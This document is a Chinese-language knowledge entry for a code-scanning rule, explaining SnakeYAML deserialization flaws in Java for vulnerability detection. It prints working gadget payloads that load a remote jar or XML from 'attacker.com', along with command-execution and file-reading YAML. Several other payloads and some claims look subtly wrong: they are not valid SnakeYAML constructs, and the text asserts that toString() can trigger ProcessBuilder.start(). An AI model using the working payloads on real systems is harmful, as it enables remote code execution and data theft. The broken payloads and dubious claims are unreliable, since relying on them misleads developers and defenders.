# Java语言SnakeYAML反序列化漏洞

> 规则 ID：`any_snakeyaml_deserialization` · 类别：deser · 关键 sink：Yaml, dump, load
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java语言SnakeYAML反序列化漏洞
SnakeYAML是Java生态中广泛使用的YAML解析库，其核心功能是将YAML格式数据与Java对象进行序列化/反序列化转换。该库的反序列化漏洞本质是**未对反序列化过程中的类实例化做严格限制**，导致攻击者可通过构造恶意YAML payload，触发危险类的实例化与方法执行，最终实现远程代码执行（RCE）、数据篡改、权限提升等攻击效果。以下从漏洞根源、触发条件、不同攻击场景、影响版本及payload构造逻辑等维度完整描述。

## 一、漏洞核心根源
SnakeYAML的反序列化机制基于Java的反射能力，其核心组件`Yaml`类在默认配置下：
1. 支持解析YAML中的`!!`标签（YAML的类型标签），可直接指定要实例化的Java类；
2. 会自动调用目标类的构造方法（包括无参、有参构造），并为类的字段赋值；
3. 对可实例化的类无任何默认白名单/黑名单限制，攻击者可指定任意可访问的Java类；
4. 部分危险类（如`ProcessBuilder`、`Runtime`、`ClassLoader`相关类）在实例化或字段赋值时，会触发敏感操作（如执行系统命令）。

简单来说：**默认配置下，SnakeYAML会无条件解析并实例化YAML中指定的任意Java类，若该类包含危险逻辑，则会被触发执行**。

## 二、触发漏洞的核心条件
漏洞触发需同时满足以下基础条件，不同场景下会有扩展条件：
1. **使用SnakeYAML的默认反序列化配置**：未自定义`Constructor`、`TypeDescription`或`ClassLoader`限制；
2. **反序列化输入可控**：攻击者可构造并提交恶意YAML格式数据至目标系统的反序列化入口；
3. **目标环境存在可被利用的危险类**：JDK自带类（如`ProcessBuilder`）或第三方依赖类（如Spring相关类）可被实例化并执行敏感操作；
4. **Java运行时权限足够**：目标进程的系统权限决定了攻击效果（如普通权限可执行命令，root权限可接管服务器）。

## 三、不同攻击场景与触发逻辑
### 场景1：基于JDK原生类的RCE（最基础、无第三方依赖）
该场景仅依赖JDK自带类，无需额外框架，是SnakeYAML漏洞最核心的利用方式。
#### 核心利用类：
- `java.lang.ProcessBuilder`：用于创建系统进程，调用`start()`方法可执行命令；
- `java.lang.Runtime`：单例类，`getRuntime().exec()`可执行命令；
- `java.lang.ProcessImpl`：`Process`的实现类，直接关联系统进程创建。

#### 典型Payload与执行逻辑：
以`ProcessBuilder`为例，恶意YAML payload：
```yaml
!!java.lang.ProcessBuilder
command: [/bin/bash, -c, echo 'snakeyaml_rce' > /tmp/vuln.txt]
# 触发逻辑：SnakeYAML解析时实例化ProcessBuilder并为command字段赋值，若后续调用start()则执行命令；
# 进阶：结合构造方法或隐式调用start()，如通过自定义类的初始化方法触发
```
更直接的可执行Payload（通过反射触发Runtime）：
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/malicious.jar"]
  ]]
]
# 逻辑：ScriptEngineManager初始化时会遍历ClassLoader中的脚本引擎工厂，若恶意jar中包含自定义ScriptEngine，可执行任意代码；
# 或简化版（JDK8及以下有效）：
!!java.lang.Runtime [
  !!java.lang.Runtime getRuntime
]
args: [/bin/bash, -c, id > /tmp/rce.txt]
```

#### 触发前提：
- JDK版本无关键限制（JDK8及以下更易利用，JDK11+部分类访问权限收紧，但仍可绕过）；
- SnakeYAML解析时未限制类加载范围。

### 场景2：结合Spring框架的RCE（主流Web场景）
若目标系统使用Spring框架（Spring Boot/Spring MVC），攻击者可利用Spring内置的危险类放大漏洞效果，甚至无需依赖JDK原生类：
#### 核心利用类：
- `org.springframework.beans.factory.config.BeanDefinition`：Spring Bean定义类，可指定初始化方法；
- `org.springframework.beans.factory.support.BeanDefinitionReader`：解析Bean定义，触发类实例化；
- `org.springframework.context.support.ClassPathXmlApplicationContext`：Spring上下文类，加载恶意XML配置并执行命令。

#### 典型Payload逻辑：
```yaml
!!org.springframework.context.support.ClassPathXmlApplicationContext
locations: ["http://attacker.com/malicious.xml"]
# 逻辑：SnakeYAML实例化ClassPathXmlApplicationContext时，会加载远程XML配置文件；
# 恶意XML中可定义包含执行命令逻辑的Bean，如：
# <bean id="rce" class="java.lang.ProcessBuilder">
#   <constructor-arg value="/bin/bash -c whoami"/>
#   <method name="start"/>
# </bean>
```

#### 触发前提：
- 项目依赖中包含Spring Context相关jar包；
- 目标系统允许外部加载XML配置（默认Spring配置下无限制）；
- 网络可达攻击者的恶意服务器（或可构造本地文件路径）。

### 场景3：通过自定义类加载器的持久化攻击
攻击者可通过SnakeYAML反序列化加载自定义恶意类，实现持久化控制：
#### 利用逻辑：
1. 构造恶意Java类（如`MaliciousClass`，包含静态代码块执行命令），编译后打包为jar；
2. 通过YAML payload指定`URLClassLoader`加载远程恶意jar；
3. 实例化恶意类，触发静态代码块或方法执行。

#### 典型Payload：
```yaml
!!java.net.URLClassLoader
urls: [!!java.net.URL ["http://attacker.com/malicious.jar"]]
!!java.lang.Class
forName: "com.attacker.MaliciousClass"
# 逻辑：URLClassLoader加载远程jar，Class.forName实例化恶意类，触发其中的危险逻辑
```

#### 触发前提：
- 目标系统可访问外部网络（或存在本地文件包含漏洞，加载本地恶意jar）；
- 恶意类未被Java安全管理器（SecurityManager）拦截（默认无SecurityManager）；
- SnakeYAML允许加载自定义ClassLoader。

### 场景4：无直接RCE但可导致数据泄露/权限提升
若目标系统限制了命令执行相关类，但未限制其他敏感类，攻击者可利用漏洞实现数据泄露：
#### 典型利用方式：
1. **读取敏感文件**：通过`java.io.FileReader`/`java.nio.file.Files`类读取服务器配置文件（如`/etc/passwd`、`application.yml`）；
   ```yaml
   !!java.io.FileReader
   fileName: "/etc/passwd"
   # 结合流读取逻辑，将文件内容输出到可控位置
   ```
2. **修改系统属性**：通过`java.lang.System`类修改JVM系统属性，篡改应用配置；
   ```yaml
   !!java.lang.System
   setProperty: ["java.security.policy", "/tmp/malicious.policy"]
   # 逻辑：修改安全策略文件，降低JVM安全限制，为后续攻击铺路
   ```
3. **破坏应用运行**：实例化`java.lang.Thread`类创建大量线程，导致服务器资源耗尽（拒绝服务）；
   ```yaml
   !!java.util.ArrayList
   - !!java.lang.Thread
     run: !!java.lang.Runnable
       run: !!java.lang.Runtime [getRuntime, exec: ["yes > /dev/null"]]
   # 逻辑：创建大量线程执行耗资源命令，导致CPU/内存占满
   ```

#### 触发前提：
- 目标系统未限制文件IO、系统属性修改、线程创建等操作；
- 攻击者可获取反序列化后的输出（如日志、接口返回）以读取敏感数据。

## 四、影响版本范围
SnakeYAML的反序列化漏洞并非某一版本的“新增漏洞”，而是**设计层面的默认行为缺陷**，不同版本的影响程度略有差异：
1. **所有2.0之前的版本**（如1.0-1.33）：默认配置下完全暴露漏洞，无任何内置防护；
2. **2.0及以上版本**：默认禁用了对`!!`标签的类解析（仅支持基本类型），但仍可通过自定义`Constructor`恢复危险行为，若开发者手动开启类解析，仍会触发漏洞；
3. **特殊版本**：SnakeYAML 1.29+虽增加了基础的类黑名单，但黑名单可被绕过（如使用子类、别名类），无法完全防护。

## 五、漏洞触发的关键细节
1. **隐式方法执行**：部分类的字段赋值或构造方法会隐式触发危险方法，如`ProcessBuilder`的`command`字段赋值后，若类的`toString()`/`hashCode()`被调用（如日志打印），可能间接触发`start()`；
2. **序列化与反序列化的区别**：漏洞仅存在于“反序列化”过程（YAML→Java对象），序列化（Java对象→YAML）无直接风险，但序列化结果可能被复用导致二次攻击；
3. **ClassLoader的优先级**：SnakeYAML默认使用当前线程的`ContextClassLoader`，攻击者可利用这一点加载非系统类路径下的恶意类；
4. **Java安全管理器（SM）的影响**：若目标系统启用了严格的SecurityManager，可能限制部分类的实例化/方法执行，但实际生产环境中极少启用SM。

## 六、与Java原生反序列化（Serializable）的区别
SnakeYAML反序列化漏洞与传统Java Serializable反序列化漏洞（如Apache Commons Collections）核心差异：
1. **机制不同**：SnakeYAML基于反射实例化类并赋值字段，无需类实现`Serializable`接口；
2. **利用门槛更低**：无需依赖链，直接指定危险类即可触发，而传统反序列化需构造复杂依赖链；
3. **影响范围更广**：只要使用SnakeYAML解析可控YAML输入，无论是否使用序列化框架，均可能受影响；
4. **防护难度更高**：默认配置无防护，而传统反序列化可通过禁用`ObjectInputStream`降低风险。

综上，SnakeYAML反序列化漏洞的核心风险在于“无限制的类实例化能力”，其攻击场景覆盖了从基础命令执行到框架级RCE、数据泄露等全维度，且利用方式简单、门槛低，是Java生态中高危的通用型漏洞。

